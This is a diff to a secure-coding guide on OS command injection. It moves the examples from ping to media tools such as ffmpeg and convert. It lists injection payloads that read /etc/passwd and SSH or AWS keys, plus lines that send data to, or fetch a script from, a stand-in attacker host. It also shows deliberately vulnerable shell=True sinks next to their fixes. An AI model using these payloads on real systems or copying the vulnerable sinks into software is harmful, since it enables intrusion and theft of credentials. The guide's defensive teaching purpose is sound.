@@ -37,32 +37,32 @@ Use these payloads in security tests when a parameter reaches a shell or `shell=
 ### Pattern 1: Command separator (`;`)
 
 ```text
-TARGET=127.0.0.1; id
-TARGET=127.0.0.1; cat /etc/passwd
+INPUT=sample.wav; id
+INPUT=logo.png; cat /etc/passwd
 ```
 
-Becomes: `ping -c 3 127.0.0.1; id` when embedded in a shell string.
+Becomes: `ffmpeg -i sample.wav; id -f mp3 out.mp3` when embedded in a shell string.
 
 ### Pattern 2: Pipes and logical operators (`|`, `||`, `&&`)
 
 ```text
-TARGET=127.0.0.1 | whoami
-TARGET=127.0.0.1 && curl https://attacker.example/exfil
-TARGET=false || wget -O- https://attacker.example/s.sh | sh
+INPUT=clip.mp4 | whoami
+INPUT=doc.pdf && curl https://attacker.example/exfil
+INPUT=false || wget -O- https://attacker.example/s.sh | sh
 ```
 
 ### Pattern 3: Command substitution (`` `cmd` ``, `$(cmd)`)
 
 ```text
-TARGET=$(id)
-TARGET=`cat ~/.aws/credentials`
+INPUT=$(id)
+INPUT=`cat ~/.ssh/id_rsa`
 ```
 
 ### Pattern 4: Newline and argument injection
 
 ```text
-TARGET=127.0.0.1%0aid
-TARGET=-n 1 127.0.0.1; id
+INPUT=clip.mp4%0aid
+INPUT=-y -i x; id
 ```
 
 Some parsers treat `%0a` or embedded newlines as extra commands when input is passed to `sh -c`.
@@ -86,10 +86,10 @@ Search the codebase for these call patterns. Any path that concatenates or inter
 import os, subprocess
 
 os.system(user_input)
-os.popen(f"convert {user_input}")
-subprocess.call(f"ping -c 3 {host}", shell=True)
+os.popen(f"ffmpeg -i {filename} out.mp3")
+subprocess.call(f"tar czf {archive_name} uploads/", shell=True)
 subprocess.run(cmd_string, shell=True)          # cmd_string contains user data
-subprocess.check_output(user_input, shell=True)
+subprocess.check_output(user_cmd, shell=True)
 asyncio.create_subprocess_shell(user_cmd)
 ```
 
@@ -154,19 +154,21 @@ from flask import Flask, request
 
 app = Flask(__name__)
 
-@app.route("/tools/ping")
-def ping():
-    # Attacker-controlled hostname from query string
-    host = request.args.get("host", "")
+@app.route("/media/transcode")
+def transcode():
+    # Attacker-controlled input filename from query string
+    filename = request.args.get("file", "")
     # Sink: user input embedded in shell command string
-    output = subprocess.check_output(f"ping -c 3 {host}", shell=True)
+    output = subprocess.check_output(
+        f"ffmpeg -y -i uploads/{filename} -f mp3 /tmp/out.mp3", shell=True
+    )
     return output
 ```
 
 ## Step-by-Step Review Walkthrough
 
 1. **Search for process-spawning APIs.** Find `subprocess`, `os.system`, `Runtime.exec`, `Process.Start`, and `exec.Command`.
-2. **Trace the Python (or equivalent) input path.** In the sample, `host` flows into an f-string passed to a shell. Ask whether `shell=True` is required; here it enables metacharacter injection.
+2. **Trace the Python (or equivalent) input path.** In the sample, `filename` flows into an f-string passed to a shell. Ask whether `shell=True` is required; here it enables metacharacter injection.
 3. **Identify shell vs argv invocation.** Shell wrappers (`sh -c`, `cmd /c`) concatenate user data into one string. Prefer fixed binary plus separate arguments.
 4. **Review argument sources.** Trace each argument to HTTP parameters, filenames, and webhook fields.
 5. **Check wrappers around diagnostics and media tools.** Ping, traceroute, ffmpeg, and ImageMagick endpoints are common targets.
@@ -188,10 +190,10 @@ def ping():
 ### Java
 
 ```java
-public void pingHost(String hostname) throws IOException {
-    String[] cmd = { "/bin/sh", "-c", "ping -c 3 " + hostname };
-    Process p = Runtime.getRuntime().exec(cmd);
-    p.waitFor();
+public void resizeImage(String userFilename) throws IOException {
+    // User supplies "../../etc/passwd; id" as "filename"
+    String[] cmd = { "/bin/sh", "-c", "convert uploads/" + userFilename + " -resize 50% out.png" };
+    Runtime.getRuntime().exec(cmd);
 }
 ```
 
@@ -227,9 +229,9 @@ nslookup $1
 ### Go
 
 ```go
-func pingHandler(w http.ResponseWriter, r *http.Request) {
-    host := r.URL.Query().Get("host")
-    cmd := exec.Command("sh", "-c", "ping -c 3 "+host)
+func cloneRepo(w http.ResponseWriter, r *http.Request) {
+    repo := r.FormValue("repo_url") // https://x.com/a.git; curl attacker.com/s.sh|sh
+    cmd := exec.Command("git", "clone", repo, "/tmp/work")
     out, _ := cmd.CombinedOutput()
     w.Write(out)
 }
@@ -245,18 +247,19 @@ Invoke binaries with an argument list. Never pass user input through a shell.
 import re
 import subprocess
 
-HOST_PATTERN = re.compile(r"^[a-zA-Z0-9.-]{1,253}$")
+FILENAME_PATTERN = re.compile(r"^[a-zA-Z0-9._-]{1,128}$")
 
-@app.route("/tools/ping")
-def ping():
-    host = request.args.get("host", "")
-    if not HOST_PATTERN.fullmatch(host):
-        return "Invalid host", 400
+@app.route("/media/transcode")
+def transcode():
+    filename = request.args.get("file", "")
+    if not FILENAME_PATTERN.fullmatch(filename):
+        return "Invalid filename", 400
+    src = os.path.join("/var/uploads", filename)
     output = subprocess.run(
-        ["ping", "-c", "3", host],
+        ["ffmpeg", "-y", "-i", src, "-f", "mp3", "/tmp/out.mp3"],
         check=True,
         capture_output=True,
-        timeout=10,
+        timeout=60,
     )
     return output.stdout
 ```
@@ -265,8 +268,8 @@ def ping():
 
 ```python
 # Prefer native libraries when possible:
-import socket
-socket.gethostbyname(host)  # DNS lookup without shell ping
+from pydub import AudioSegment
+AudioSegment.from_file(src).export("/tmp/out.mp3", format="mp3")
 ```
 
 ### Java
